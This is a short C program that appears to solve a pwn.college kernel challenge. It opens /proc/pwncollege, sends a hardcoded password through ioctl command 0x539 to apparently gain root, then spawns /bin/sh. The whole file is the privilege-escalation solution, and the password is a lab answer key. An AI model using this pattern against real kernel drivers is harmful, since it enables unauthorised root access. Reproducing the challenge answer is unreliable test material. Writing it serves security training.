#include <stdio.h> 
#include <string.h> 
#include <fcntl.h> // file control. Allows me to use open()
#include <unistd.h> // unix standard. Allows me to use close()
#include <sys/ioctl.h> // ioctl! Allows me to use the ioctl syscall!
#include <stdlib.h>

int main() {
	int fd = open("/proc/pwncollege", O_RDWR); // read and write flag
	
	char data[1024] = "emrbpgldsrexybrh";
	
	int result = ioctl(fd, 0x539, data); // 0x539 is the cmd option. In the source code, ioctl takes these arguments so...
	printf("ioctl result is : %d", result);
	
	system("/bin/sh");
	
	close(fd);
	return 0;
}
